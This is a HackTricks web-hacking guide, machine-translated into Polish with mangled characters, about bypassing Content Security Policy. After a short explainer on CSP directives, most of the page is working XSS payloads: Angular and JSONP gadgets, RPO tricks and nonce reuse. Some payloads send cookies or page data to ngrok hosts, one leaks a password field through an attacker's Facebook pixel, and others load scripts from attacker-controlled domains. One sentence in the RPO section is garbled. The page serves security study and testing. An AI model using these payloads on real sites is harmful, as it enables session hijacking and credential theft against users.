# Content Security Policy (CSP) Bypass

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## What is CSP

Content Security Policy (CSP) jest uznawana za technologiÄ™ przeglÄ…darki, gÅ‚Ã³wnie majÄ…cÄ… na celu **ochronÄ™ przed atakami takimi jak cross-site scripting (XSS)**. DziaÅ‚a poprzez definiowanie i szczegÃ³Å‚owe okreÅ›lenie Å›cieÅ¼ek i ÅºrÃ³deÅ‚, z ktÃ³rych zasoby mogÄ… byÄ‡ bezpiecznie Å‚adowane przez przeglÄ…darkÄ™. Te zasoby obejmujÄ… szereg elementÃ³w, takich jak obrazy, ramki i JavaScript. Na przykÅ‚ad, polityka moÅ¼e zezwalaÄ‡ na Å‚adowanie i wykonywanie zasobÃ³w z tej samej domeny (self), w tym zasobÃ³w inline oraz wykonywanie kodu w postaci stringÃ³w za pomocÄ… funkcji takich jak `eval`, `setTimeout` lub `setInterval`.

WdroÅ¼enie CSP odbywa siÄ™ poprzez **nagÅ‚Ã³wki odpowiedzi** lub poprzez wÅ‚Ä…czenie **elementÃ³w meta do strony HTML**. Zgodnie z tÄ… politykÄ…, przeglÄ…darki proaktywnie egzekwujÄ… te postanowienia i natychmiast blokujÄ… wszelkie wykryte naruszenia.

* Implemented via response header:
```
Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
```
* Zaimplementowane za pomocÄ… tagu meta:
```xml
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
```
### NagÅ‚Ã³wki

CSP moÅ¼e byÄ‡ egzekwowane lub monitorowane za pomocÄ… tych nagÅ‚Ã³wkÃ³w:

* `Content-Security-Policy`: Egzekwuje CSP; przeglÄ…darka blokuje wszelkie naruszenia.
* `Content-Security-Policy-Report-Only`: UÅ¼ywane do monitorowania; raportuje naruszenia bez ich blokowania. Idealne do testowania w Å›rodowiskach przedprodukcyjnych.

### Definiowanie zasobÃ³w

CSP ogranicza ÅºrÃ³dÅ‚a Å‚adowania zarÃ³wno aktywnej, jak i pasywnej zawartoÅ›ci, kontrolujÄ…c aspekty takie jak wykonywanie JavaScriptu w linii i uÅ¼ycie `eval()`. PrzykÅ‚adowa polityka to:
```bash
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```
### Dyrektywy

* **script-src**: Zezwala na okreÅ›lone ÅºrÃ³dÅ‚a dla JavaScript, w tym adresy URL, skrypty inline oraz skrypty wywoÅ‚ywane przez obsÅ‚ugiwacze zdarzeÅ„ lub arkusze stylÃ³w XSLT.
* **default-src**: Ustala domyÅ›lnÄ… politykÄ™ pobierania zasobÃ³w, gdy brak jest konkretnych dyrektyw pobierania.
* **child-src**: OkreÅ›la dozwolone zasoby dla pracownikÃ³w sieciowych i zawartoÅ›ci osadzonych ramek.
* **connect-src**: Ogranicza adresy URL, ktÃ³re mogÄ… byÄ‡ Å‚adowane za pomocÄ… interfejsÃ³w takich jak fetch, WebSocket, XMLHttpRequest.
* **frame-src**: Ogranicza adresy URL dla ramek.
* **frame-ancestors**: OkreÅ›la, ktÃ³re ÅºrÃ³dÅ‚a mogÄ… osadzaÄ‡ bieÅ¼Ä…cÄ… stronÄ™, stosowane do elementÃ³w takich jak `<frame>`, `<iframe>`, `<object>`, `<embed>`, i `<applet>`.
* **img-src**: Definiuje dozwolone ÅºrÃ³dÅ‚a dla obrazÃ³w.
* **font-src**: OkreÅ›la waÅ¼ne ÅºrÃ³dÅ‚a dla czcionek Å‚adowanych za pomocÄ… `@font-face`.
* **manifest-src**: Definiuje dozwolone ÅºrÃ³dÅ‚a plikÃ³w manifestu aplikacji.
* **media-src**: Definiuje dozwolone ÅºrÃ³dÅ‚a do Å‚adowania obiektÃ³w multimedialnych.
* **object-src**: Definiuje dozwolone ÅºrÃ³dÅ‚a dla elementÃ³w `<object>`, `<embed>`, i `<applet>`.
* **base-uri**: OkreÅ›la dozwolone adresy URL do Å‚adowania za pomocÄ… elementÃ³w `<base>`.
* **form-action**: Wymienia waÅ¼ne punkty koÅ„cowe dla przesyÅ‚ania formularzy.
* **plugin-types**: Ogranicza typy mime, ktÃ³re strona moÅ¼e wywoÅ‚aÄ‡.
* **upgrade-insecure-requests**: Instrukcje dla przeglÄ…darek, aby przepisaÄ‡ adresy URL HTTP na HTTPS.
* **sandbox**: Stosuje ograniczenia podobne do atrybutu sandbox w `<iframe>`.
* **report-to**: OkreÅ›la grupÄ™, do ktÃ³rej zostanie wysÅ‚any raport, jeÅ›li polityka zostanie naruszona.
* **worker-src**: OkreÅ›la waÅ¼ne ÅºrÃ³dÅ‚a dla skryptÃ³w Worker, SharedWorker lub ServiceWorker.
* **prefetch-src**: OkreÅ›la waÅ¼ne ÅºrÃ³dÅ‚a dla zasobÃ³w, ktÃ³re bÄ™dÄ… pobierane lub wstÄ™pnie pobierane.
* **navigate-to**: Ogranicza adresy URL, do ktÃ³rych dokument moÅ¼e nawigowaÄ‡ wszelkimi Å›rodkami (a, formularz, window.location, window.open, itp.)

### Å¹rÃ³dÅ‚a

* `*`: Zezwala na wszystkie adresy URL z wyjÄ…tkiem tych z schematami `data:`, `blob:`, `filesystem:`.
* `'self'`: Zezwala na Å‚adowanie z tej samej domeny.
* `'data'`: Zezwala na Å‚adowanie zasobÃ³w za pomocÄ… schematu danych (np. obrazy zakodowane w Base64).
* `'none'`: Blokuje Å‚adowanie z jakiegokolwiek ÅºrÃ³dÅ‚a.
* `'unsafe-eval'`: Zezwala na uÅ¼ycie `eval()` i podobnych metod, niezalecane z powodÃ³w bezpieczeÅ„stwa.
* `'unsafe-hashes'`: UmoÅ¼liwia okreÅ›lone inline event handlers.
* `'unsafe-inline'`: Zezwala na uÅ¼ycie zasobÃ³w inline, takich jak inline `<script>` lub `<style>`, niezalecane z powodÃ³w bezpieczeÅ„stwa.
* `'nonce'`: Lista dozwolonych dla okreÅ›lonych skryptÃ³w inline z uÅ¼yciem kryptograficznego nonca (liczba uÅ¼ywana raz).
* JeÅ›li masz ograniczonÄ… moÅ¼liwoÅ›Ä‡ wykonania JS, moÅ¼liwe jest uzyskanie uÅ¼ywanego nonca wewnÄ…trz strony za pomocÄ… `doc.defaultView.top.document.querySelector("[nonce]")` i ponowne uÅ¼ycie go do zaÅ‚adowania zÅ‚oÅ›liwego skryptu (jeÅ›li uÅ¼yto strict-dynamic, kaÅ¼de dozwolone ÅºrÃ³dÅ‚o moÅ¼e Å‚adowaÄ‡ nowe ÅºrÃ³dÅ‚a, wiÄ™c to nie jest potrzebne), jak w:

<details>

<summary>ZaÅ‚aduj skrypt ponownie uÅ¼ywajÄ…c nonca</summary>
```html
<!-- From https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/ -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
</details>

* `'sha256-<hash>'`: BiaÅ‚a lista skryptÃ³w z okreÅ›lonym hashem sha256.
* `'strict-dynamic'`: Pozwala na Å‚adowanie skryptÃ³w z dowolnego ÅºrÃ³dÅ‚a, jeÅ›li zostaÅ‚o to dodane do biaÅ‚ej listy za pomocÄ… nonce lub hasha.
* `'host'`: OkreÅ›la konkretny host, taki jak `example.com`.
* `https:`: Ogranicza adresy URL do tych, ktÃ³re uÅ¼ywajÄ… HTTPS.
* `blob:`: Pozwala na Å‚adowanie zasobÃ³w z adresÃ³w URL Blob (np. adresy URL Blob utworzone za pomocÄ… JavaScript).
* `filesystem:`: Pozwala na Å‚adowanie zasobÃ³w z systemu plikÃ³w.
* `'report-sample'`: Zawiera prÃ³bkÄ™ naruszajÄ…cego kodu w raporcie o naruszeniu (przydatne do debugowania).
* `'strict-origin'`: Podobne do 'self', ale zapewnia, Å¼e poziom bezpieczeÅ„stwa protokoÅ‚u ÅºrÃ³deÅ‚ odpowiada dokumentowi (tylko bezpieczne ÅºrÃ³dÅ‚a mogÄ… Å‚adowaÄ‡ zasoby z bezpiecznych ÅºrÃ³deÅ‚).
* `'strict-origin-when-cross-origin'`: WysyÅ‚a peÅ‚ne adresy URL podczas wykonywania Å¼Ä…daÅ„ z tego samego ÅºrÃ³dÅ‚a, ale wysyÅ‚a tylko ÅºrÃ³dÅ‚o, gdy Å¼Ä…danie jest miÄ™dzy ÅºrÃ³dÅ‚ami.
* `'unsafe-allow-redirects'`: Pozwala na Å‚adowanie zasobÃ³w, ktÃ³re natychmiast przekierujÄ… do innego zasobu. Nie jest zalecane, poniewaÅ¼ osÅ‚abia bezpieczeÅ„stwo.

## Niebezpieczne zasady CSP

### 'unsafe-inline'
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-inline';
```
DziaÅ‚ajÄ…cy Å‚adunek: `"/><script>alert(1);</script>`

#### self + 'unsafe-inline' za pomocÄ… Iframes

{% content-ref url="csp-bypass-self-+-unsafe-inline-with-iframes.md" %}
[csp-bypass-self-+-unsafe-inline-with-iframes.md](csp-bypass-self-+-unsafe-inline-with-iframes.md)
{% endcontent-ref %}

### 'unsafe-eval'

{% hint style="danger" %}
To nie dziaÅ‚a, aby uzyskaÄ‡ wiÄ™cej informacji [**sprawdÅº to**](https://github.com/HackTricks-wiki/hacktricks/issues/653).
{% endhint %}
```yaml
Content-Security-Policy: script-src https://google.com 'unsafe-eval';
```
DziaÅ‚ajÄ…cy Å‚adunek:
```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```
### strict-dynamic

JeÅ›li w jakiÅ› sposÃ³b moÅ¼esz sprawiÄ‡, Å¼e **dozwolony kod JS utworzy nowy tag skryptu** w DOM z twoim kodem JS, poniewaÅ¼ dozwolony skrypt go tworzy, **nowy tag skryptu bÄ™dzie mÃ³gÅ‚ byÄ‡ wykonany**.

### Wildcard (\*)
```yaml
Content-Security-Policy: script-src 'self' https://google.com https: data *;
```
DziaÅ‚ajÄ…cy Å‚adunek:
```markup
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```
### Brak object-src i default-src

{% hint style="danger" %}
**WyglÄ…da na to, Å¼e to juÅ¼ nie dziaÅ‚a**
{% endhint %}
```yaml
Content-Security-Policy: script-src 'self' ;
```
DziaÅ‚ajÄ…ce Å‚adunki:
```markup
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```
### PrzesyÅ‚anie plikÃ³w + 'self'
```yaml
Content-Security-Policy: script-src 'self';  object-src 'none' ;
```
JeÅ›li moÅ¼esz przesÅ‚aÄ‡ plik JS, moÅ¼esz obejÅ›Ä‡ ten CSP:

DziaÅ‚ajÄ…cy Å‚adunek:
```markup
"/>'><script src="/uploads/picture.png.js"></script>
```
JednakÅ¼e, jest bardzo prawdopodobne, Å¼e serwer **waliduje przesÅ‚any plik** i pozwoli ci tylko na **przesyÅ‚anie okreÅ›lonego typu plikÃ³w**.

Ponadto, nawet jeÅ›li udaÅ‚oby ci siÄ™ przesÅ‚aÄ‡ **kod JS wewnÄ…trz** pliku z rozszerzeniem akceptowanym przez serwer (jak: _script.png_), to nie wystarczy, poniewaÅ¼ niektÃ³re serwery, takie jak serwer apache, **wybierajÄ… typ MIME pliku na podstawie rozszerzenia**, a przeglÄ…darki takie jak Chrome **odrzucÄ… wykonanie kodu Javascript** wewnÄ…trz czegoÅ›, co powinno byÄ‡ obrazem. "Na szczÄ™Å›cie", sÄ… bÅ‚Ä™dy. Na przykÅ‚ad, z CTF dowiedziaÅ‚em siÄ™, Å¼e **Apache nie zna** rozszerzenia _**.wave**_, dlatego nie serwuje go z **typem MIME jak audio/\***.

StÄ…d, jeÅ›li znajdziesz XSS i przesyÅ‚anie plikÃ³w, i uda ci siÄ™ znaleÅºÄ‡ **bÅ‚Ä™dnie zinterpretowane rozszerzenie**, moÅ¼esz sprÃ³bowaÄ‡ przesÅ‚aÄ‡ plik z tym rozszerzeniem i zawartoÅ›ciÄ… skryptu. Lub, jeÅ›li serwer sprawdza poprawny format przesyÅ‚anego pliku, stwÃ³rz poliglot ([przykÅ‚ady poliglotÃ³w tutaj](https://github.com/Polydet/polyglot-database)).

### Form-action

JeÅ›li nie ma moÅ¼liwoÅ›ci wstrzykniÄ™cia JS, moÅ¼esz sprÃ³bowaÄ‡ wyeksfiltrowaÄ‡ na przykÅ‚ad dane uwierzytelniajÄ…ce **wstrzykujÄ…c akcjÄ™ formularza** (i byÄ‡ moÅ¼e oczekujÄ…c, Å¼e menedÅ¼ery haseÅ‚ automatycznie wypeÅ‚niÄ… hasÅ‚a). MoÅ¼esz znaleÅºÄ‡ [**przykÅ‚ad w tym raporcie**](https://portswigger.net/research/stealing-passwords-from-infosec-mastodon-without-bypassing-csp). ZauwaÅ¼ rÃ³wnieÅ¼, Å¼e `default-src` nie obejmuje akcji formularzy.

### Third Party Endpoints + ('unsafe-eval')

{% hint style="warning" %}
Dla niektÃ³rych z poniÅ¼szych Å‚adunkÃ³w **`unsafe-eval` nie jest nawet potrzebne**.
{% endhint %}
```yaml
Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';
```
ZaÅ‚aduj podatnÄ… wersjÄ™ angular i wykonaj dowolny JS:
```xml
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>


"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>


"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>


With some bypasses from: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
</script>
<img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```
#### Payloads using Angular + a library with functions that return the `window` object ([check out this post](https://blog.huli.tw/2022/09/01/en/angularjs-csp-bypass-cdnjs/)):

{% hint style="info" %}
Post pokazuje, Å¼e moÅ¼esz **zaÅ‚adowaÄ‡** wszystkie **biblioteki** z `cdn.cloudflare.com` (lub z dowolnego innego dozwolonego repozytorium JS), wykonaÄ‡ wszystkie dodane funkcje z kaÅ¼dej biblioteki i sprawdziÄ‡ **ktÃ³re funkcje z ktÃ³rych bibliotek zwracajÄ… obiekt `window`**.
{% endhint %}
```markup
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
{{$on.curry.call().alert(1)}}
{{[].empty.call().alert([].empty.call().document.domain)}}
{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{$on.curry.call().alert('xss')}}
</div>


<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
{{[].erase.call().alert('xss')}}
</div>
```
Angular XSS z nazwy klasy:
```html
<div ng-app>
<strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```
#### Wykorzystywanie kodu JS google recaptcha

Zgodnie z [**tym opisem CTF**](https://blog-huli-tw.translate.goog/2023/07/28/google-zer0pts-imaginary-ctf-2023-writeup/?\_x\_tr\_sl=es&\_x\_tr\_tl=en&\_x\_tr\_hl=es&\_x\_tr\_pto=wapp#noteninja-3-solves) moÅ¼esz wykorzystaÄ‡ [https://www.google.com/recaptcha/](https://www.google.com/recaptcha/) wewnÄ…trz CSP, aby wykonaÄ‡ dowolny kod JS, omijajÄ…c CSP:
```html
<div
ng-controller="CarouselController as c"
ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```
WiÄ™cej [**Å‚adunkÃ³w z tego opisu**](https://joaxcar.com/blog/2024/02/19/csp-bypass-on-portswigger-net-using-google-script-resources/):
```html
<script src='https://www.google.com/recaptcha/about/js/main.min.js'></script>

<!-- Trigger alert -->
<img src=x ng-on-error='$event.target.ownerDocument.defaultView.alert(1)'>

<!-- Reuse nonce -->
<img src=x ng-on-error='
doc=$event.target.ownerDocument;
a=doc.defaultView.top.document.querySelector("[nonce]");
b=doc.createElement("script");
b.src="//example.com/evil.js";
b.nonce=a.nonce; doc.body.appendChild(b)'>
```
#### Wykorzystywanie www.google.com do otwartego przekierowania

PoniÅ¼szy URL przekierowuje do example.com (z [tutaj](https://www.landh.tech/blog/20240304-google-hack-50000/)):
```
https://www.google.com/amp/s/example.com/
```
Abusowanie \*.google.com/script.google.com

MoÅ¼liwe jest naduÅ¼ycie Google Apps Script, aby otrzymaÄ‡ informacje na stronie wewnÄ…trz script.google.com. Jak to [zrobiono w tym raporcie](https://embracethered.com/blog/posts/2023/google-bard-data-exfiltration/).

### Punkty koÅ„cowe stron trzecich + JSONP
```http
Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';
```
Scenariusze takie jak ten, w ktÃ³rym `script-src` jest ustawione na `self` oraz na okreÅ›lonÄ… domenÄ™, ktÃ³ra jest na liÅ›cie dozwolonych, mogÄ… byÄ‡ obejÅ›cie za pomocÄ… JSONP. Punkty koÅ„cowe JSONP pozwalajÄ… na niebezpieczne metody wywoÅ‚aÅ„ zwrotnych, co umoÅ¼liwia atakujÄ…cemu przeprowadzenie XSS, dziaÅ‚ajÄ…cy Å‚adunek:
```markup
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>
```

```html
https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>
```
[**JSONBee**](https://github.com/zigoo0/JSONBee) **zawiera gotowe do uÅ¼ycia punkty koÅ„cowe JSONP do obejÅ›cia CSP rÃ³Å¼nych stron internetowych.**

Ta sama podatnoÅ›Ä‡ wystÄ…pi, jeÅ›li **zaufany punkt koÅ„cowy zawiera Open Redirect**, poniewaÅ¼ jeÅ›li poczÄ…tkowy punkt koÅ„cowy jest zaufany, przekierowania sÄ… zaufane.

### NaduÅ¼ycia ze strony osÃ³b trzecich

Jak opisano w [nastÄ™pujÄ…cym poÅ›cie](https://sensepost.com/blog/2023/dress-code-the-talk/#bypasses), istnieje wiele domen osÃ³b trzecich, ktÃ³re mogÄ… byÄ‡ dozwolone gdzieÅ› w CSP, ktÃ³re mogÄ… byÄ‡ naduÅ¼ywane do eksfiltracji danych lub wykonywania kodu JavaScript. NiektÃ³re z tych osÃ³b trzecich to:

| Podmiot            | Dozwolona domena                             | MoÅ¼liwoÅ›ci   |
| ------------------ | -------------------------------------------- | ------------ |
| Facebook           | www.facebook.com, \*.facebook.com            | Exfil        |
| Hotjar             | \*.hotjar.com, ask.hotjar.io                | Exfil        |
| Jsdelivr           | \*.jsdelivr.com, cdn.jsdelivr.net            | Exec         |
| Amazon CloudFront  | \*.cloudfront.net                            | Exfil, Exec  |
| Amazon AWS         | \*.amazonaws.com                             | Exfil, Exec  |
| Azure Websites     | \*.azurewebsites.net, \*.azurestaticapps.net | Exfil, Exec  |
| Salesforce Heroku  | \*.herokuapp.com                             | Exfil, Exec  |
| Google Firebase    | \*.firebaseapp.com                           | Exfil, Exec  |

JeÅ›li znajdziesz ktÃ³rÄ…kolwiek z dozwolonych domen w CSP twojego celu, istnieje szansa, Å¼e bÄ™dziesz mÃ³gÅ‚ obejÅ›Ä‡ CSP, rejestrujÄ…c siÄ™ w usÅ‚udze osÃ³b trzecich i eksfiltrujÄ…c dane do tej usÅ‚ugi lub wykonujÄ…c kod.

Na przykÅ‚ad, jeÅ›li znajdziesz nastÄ™pujÄ…ce CSP:
```
Content-Security-Policyâ€‹: default-src 'selfâ€™ www.facebook.com;â€‹
```
lub
```
Content-Security-Policyâ€‹: connect-src www.facebook.com;â€‹
```
PowinieneÅ› byÄ‡ w stanie wyeksportowaÄ‡ dane, podobnie jak zawsze robiono to z [Google Analytics](https://www.humansecurity.com/tech-engineering-blog/exfiltrating-users-private-data-using-google-analytics-to-bypass-csp)/[Google Tag Manager](https://blog.deteact.com/csp-bypass/). W tym przypadku postÄ™puj zgodnie z tymi ogÃ³lnymi krokami:

1. UtwÃ³rz konto dewelopera Facebook tutaj.
2. UtwÃ³rz nowÄ… aplikacjÄ™ "Facebook Login" i wybierz "Strona internetowa".
3. PrzejdÅº do "Ustawienia -> Podstawowe" i zdobÄ…dÅº swÃ³j "App ID".
4. Na docelowej stronie, z ktÃ³rej chcesz wyeksportowaÄ‡ dane, moÅ¼esz wyeksportowaÄ‡ dane, bezpoÅ›rednio uÅ¼ywajÄ…c gadÅ¼etu SDK Facebooka "fbq" przez "customEvent" i Å‚adunek danych.
5. PrzejdÅº do swojego "MenedÅ¼era zdarzeÅ„" aplikacji i wybierz utworzonÄ… aplikacjÄ™ (zauwaÅ¼, Å¼e menedÅ¼er zdarzeÅ„ moÅ¼na znaleÅºÄ‡ pod adresem URL podobnym do tego: https://www.facebook.com/events\_manager2/list/pixel/\[app-id]/test\_events).
6. Wybierz zakÅ‚adkÄ™ "Test Events", aby zobaczyÄ‡ zdarzenia wysyÅ‚ane przez "twojÄ…" stronÄ™ internetowÄ….

NastÄ™pnie, po stronie ofiary, wykonujesz nastÄ™pujÄ…cy kod, aby zainicjowaÄ‡ piksel Å›ledzenia Facebooka, wskazujÄ…c na app-id konta dewelopera napastnika i wydajÄ…c niestandardowe zdarzenie w ten sposÃ³b:
```JavaScript
fbq('init', '1279785999289471');â€‹ // this number should be the App ID of the attacker's Meta/Facebook account
fbq('trackCustom', 'My-Custom-Event',{â€‹
data: "Leaked user password: '"+document.getElementById('user-password').innerText+"'"â€‹
});
```
JeÅ›li chodzi o pozostaÅ‚e siedem domen zewnÄ™trznych okreÅ›lonych w poprzedniej tabeli, istnieje wiele innych sposobÃ³w, w jakie moÅ¼na je naduÅ¼yÄ‡. OdwoÅ‚aj siÄ™ do wczeÅ›niej [postu na blogu](https://sensepost.com/blog/2023/dress-codethe-talk/#bypasses) w celu uzyskania dodatkowych wyjaÅ›nieÅ„ na temat innych naduÅ¼yÄ‡ zwiÄ…zanych z zewnÄ™trznymi.

### Bypass za pomocÄ… RPO (Relative Path Overwrite) <a href="#bypass-via-rpo-relative-path-overwrite" id="bypass-via-rpo-relative-path-overwrite"></a>

OprÃ³cz wspomnianego wczeÅ›niej przekierowania w celu obejÅ›cia ograniczeÅ„ Å›cieÅ¼ki, istnieje inna technika zwana Relative Path Overwrite (RPO), ktÃ³ra moÅ¼e byÄ‡ uÅ¼ywana na niektÃ³rych serwerach.

Na przykÅ‚ad, jeÅ›li CSP zezwala na Å›cieÅ¼kÄ™ `https://example.com/scripts/react/`, moÅ¼na jÄ… obejÅ›Ä‡ w nastÄ™pujÄ…cy sposÃ³b:
```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```
PrzeglÄ…darka ostatecznie zaÅ‚aduje `https://example.com/scripts/angular/angular.js`.

DziaÅ‚a to, poniewaÅ¼ dla przeglÄ…darki Å‚adujesz plik o nazwie `..%2fangular%2fangular.js` znajdujÄ…cy siÄ™ pod `https://example.com/scripts/react/`, co jest zgodne z CSP.

âˆ‘, zdekodujÄ… to, skutecznie Å¼Ä…dajÄ…c `https://example.com/scripts/react/../angular/angular.js`, co jest rÃ³wnowaÅ¼ne `https://example.com/scripts/angular/angular.js`.

Poprzez **wykorzystanie tej niespÃ³jnoÅ›ci w interpretacji URL miÄ™dzy przeglÄ…darkÄ… a serwerem, zasady Å›cieÅ¼ki mogÄ… byÄ‡ obejÅ›cie**.

RozwiÄ…zaniem jest nie traktowanie `%2f` jako `/` po stronie serwera, zapewniajÄ…c spÃ³jnÄ… interpretacjÄ™ miÄ™dzy przeglÄ…darkÄ… a serwerem, aby uniknÄ…Ä‡ tego problemu.

PrzykÅ‚ad online:[ ](https://jsbin.com/werevijewa/edit?html,output)[https://jsbin.com/werevijewa/edit?html,output](https://jsbin.com/werevijewa/edit?html,output)

### Wykonanie JS w Iframe

{% content-ref url="../xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](../xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### brak **base-uri**

JeÅ›li dyrektywa **base-uri** jest brakujÄ…ca, moÅ¼esz to wykorzystaÄ‡ do przeprowadzenia [**wstrzykniÄ™cia wiszÄ…cego markup**](../dangling-markup-html-scriptless-injection/).

Ponadto, jeÅ›li **strona Å‚aduje skrypt za pomocÄ… Å›cieÅ¼ki wzglÄ™dnej** (jak `<script src="/js/app.js">`) uÅ¼ywajÄ…c **Nonce**, moÅ¼esz wykorzystaÄ‡ **tag** **base**, aby **zaÅ‚adowaÄ‡** skrypt z **twojego wÅ‚asnego serwera, osiÄ…gajÄ…c XSS.**\
JeÅ›li podatna strona jest Å‚adowana z **httpS**, uÅ¼yj adresu httpS w tagu base.
```html
<base href="https://www.attacker.com/">
```
### AngularJS events

Specyficzna polityka znana jako Content Security Policy (CSP) moÅ¼e ograniczaÄ‡ zdarzenia JavaScript. Niemniej jednak, AngularJS wprowadza niestandardowe zdarzenia jako alternatywÄ™. W ramach zdarzenia, AngularJS dostarcza unikalny obiekt `$event`, odnoszÄ…cy siÄ™ do natywnego obiektu zdarzenia przeglÄ…darki. Obiekt `$event` moÅ¼e byÄ‡ wykorzystany do obejÅ›cia CSP. Co waÅ¼ne, w Chrome, obiekt `$event/event` posiada atrybut `path`, zawierajÄ…cy tablicÄ™ obiektÃ³w zaangaÅ¼owanych w Å‚aÅ„cuch wykonania zdarzenia, z obiektem `window` zawsze umiejscowionym na koÅ„cu. Ta struktura jest kluczowa dla taktyk ucieczki z piaskownicy.

KierujÄ…c tÄ™ tablicÄ™ do filtra `orderBy`, moÅ¼liwe jest iterowanie po niej, wykorzystujÄ…c element koÅ„cowy (obiekt `window`) do wywoÅ‚ania globalnej funkcji, takiej jak `alert()`. PoniÅ¼szy fragment kodu ilustruje ten proces:
```xml
<input%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```
Ten fragment podkreÅ›la uÅ¼ycie dyrektywy `ng-focus` do wywoÅ‚ania zdarzenia, wykorzystujÄ…c `$event.path|orderBy` do manipulacji tablicÄ… `path`, oraz korzystajÄ…c z obiektu `window` do wykonania funkcji `alert()`, ujawniajÄ…c tym samym `document.cookie`.

**ZnajdÅº inne obejÅ›cia Angulara w** [**https://portswigger.net/web-security/cross-site-scripting/cheat-sheet**](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

